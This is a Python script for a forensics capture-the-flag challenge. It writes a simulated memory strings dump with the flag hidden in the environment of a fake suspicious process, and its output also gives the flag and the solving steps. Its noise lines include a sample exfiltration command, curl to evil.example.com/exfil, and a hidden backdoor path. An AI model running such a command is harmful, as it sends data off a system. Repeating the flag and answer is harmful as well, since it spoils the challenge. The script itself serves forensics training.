#!/usr/bin/env python3
"""
Forensics Challenge: Memory Dump
Simulates a memory strings dump with the flag hidden among realistic
process data and environment variables.

Usage: python3 simulate.py
Output: memory_strings.txt (simulated output of `strings` on a memory dump)
"""

import os
import random
import string

FLAG = "zemi{v0l4t1l1ty_m3m0ry_hunt3r}"


def random_string(length=12):
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def random_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def generate_noise_lines(count=50):
    """Generate realistic-looking memory strings."""
    lines = []
    paths = [
        "/usr/lib/x86_64-linux-gnu/libc-2.31.so",
        "/usr/bin/python3.9",
        "/lib/systemd/systemd",
        "/usr/sbin/sshd",
        "/usr/bin/bash",
        "C:\\Windows\\System32\\ntdll.dll",
        "C:\\Windows\\System32\\kernel32.dll",
        "/proc/self/maps",
        "/etc/ld.so.cache",
    ]
    env_vars = [
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "HOME=/root",
        "SHELL=/bin/bash",
        "LANG=en_US.UTF-8",
        "TERM=xterm-256color",
        "USER=www-data",
        "LOGNAME=www-data",
        "PWD=/var/www/html",
        "HOSTNAME=webserver01",
        "DISPLAY=:0",
        f"SESSION_ID={random_string(32)}",
        f"MYSQL_PASSWORD={random_string(16)}",
        "LD_LIBRARY_PATH=/usr/local/lib",
    ]
    procs = [
        "PID: 1     /sbin/init",
        "PID: 245   /usr/sbin/cron",
        "PID: 312   /usr/sbin/sshd -D",
        "PID: 501   /usr/sbin/apache2 -k start",
        "PID: 892   /usr/bin/python3 /opt/app/server.py",
        "PID: 1024  /usr/bin/bash",
        "PID: 1337  /tmp/.hidden/backdoor",
        "PID: 1338  /usr/bin/curl http://evil.example.com/exfil",
    ]
    misc = [
        f"TCP {random_ip()}:{random.randint(1024,65535)} -> {random_ip()}:443 ESTABLISHED",
        f"TCP {random_ip()}:{random.randint(1024,65535)} -> {random_ip()}:80 ESTABLISHED",
        "GET /api/v1/users HTTP/1.1",
        "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.fake.token",
        "MySQL connection established",
        "Login successful for user admin",
        "Failed password for root from 10.0.0.99 port 22 ssh2",
        "Starting cron job: /etc/cron.d/backup",
        random_string(40),
        random_string(60),
    ]

    for _ in range(count):
        category = random.choice(["path", "env", "proc", "misc", "junk"])
        if category == "path":
            lines.append(random.choice(paths))
        elif category == "env":
            lines.append(random.choice(env_vars))
        elif category == "proc":
            lines.append(random.choice(procs))
        elif category == "misc":
            lines.append(random.choice(misc))
        else:
            lines.append(random_string(random.randint(8, 64)))
    return lines


def main():
    output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "memory_strings.txt")

    random.seed(42)  # Reproducible output

    lines = []

    # Section 1: early memory noise
    lines.append("=== Memory Strings Dump ===")
    lines.append("Image: memory.raw")
    lines.append("Profile: Win7SP1x64 (simulated)")
    lines.append("")
    lines.extend(generate_noise_lines(80))

    # Section 2: process listing area
    lines.append("")
    lines.append("--- Process List ---")
    lines.append("PID    PPID   Name              Offset")
    lines.append("1      0      System            0x0000fa8000c00040")
    lines.append("4      1      smss.exe          0x0000fa8001a00300")
    lines.append("312    4      csrss.exe         0x0000fa8002100040")
    lines.append("380    4      wininit.exe       0x0000fa8002200040")
    lines.append("500    380    services.exe      0x0000fa8002500040")
    lines.append("1337   500    suspicious.exe    0x0000fa8003a00b30")
    lines.append("2048   500    svchost.exe       0x0000fa8004000040")
    lines.append("")
    lines.extend(generate_noise_lines(40))

    # Section 3: environment variables of suspicious process (flag is here)
    lines.append("")
    lines.append("--- Environment for PID 1337 (suspicious.exe) ---")
    lines.append("COMPUTERNAME=VICTIM-PC")
    lines.append("USERNAME=Administrator")
    lines.append("USERPROFILE=C:\\Users\\Administrator")
    lines.append("APPDATA=C:\\Users\\Administrator\\AppData\\Roaming")
    lines.append(f"SECRET_FLAG={FLAG}")  # <-- THE FLAG
    lines.append("TEMP=C:\\Users\\Administrator\\AppData\\Local\\Temp")
    lines.append("COMSPEC=C:\\Windows\\system32\\cmd.exe")
    lines.append("SystemRoot=C:\\Windows")
    lines.append("OS=Windows_NT")
    lines.append("")

    # Section 4: more noise after the flag
    lines.extend(generate_noise_lines(100))
    lines.append("")
    lines.append("=== End of Strings Dump ===")

    with open(output_path, "w") as f:
        f.write("\n".join(lines) + "\n")

    print(f"[+] Created {output_path}")
    print(f"    Total lines: {len(lines)}")
    print()
    print("To solve:")
    print("  grep -i 'flag\\|secret\\|zemi' memory_strings.txt")
    print("  # Look for environment variables of PID 1337")


if __name__ == "__main__":
    main()
